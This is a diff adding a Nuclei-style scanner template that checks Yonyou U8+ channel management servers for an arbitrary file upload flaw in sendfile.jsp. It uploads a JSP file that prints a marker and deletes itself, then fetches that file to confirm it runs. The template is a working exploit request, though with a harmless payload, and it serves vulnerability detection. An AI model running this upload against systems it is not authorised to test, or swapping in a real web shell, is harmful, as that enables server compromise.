@@ -1,0 +1,60 @@
+id: poc-yaml-yongyon-u8-cm-ae-sendfile-jsp-anyfile-upload
+
+info:
+  name: 用友U8+渠道管理(高级版) sendfile.jsp 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+
+variables:
+  t1: "{{rand_text_alpha(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/business/common/importdata/sendfile.jsp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "userfile"
+          - ".jsp"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        part: body
+        regex:
+          - "(?P<file>[0-9a-z]{32}).jsp"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/userfile/default/temp/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
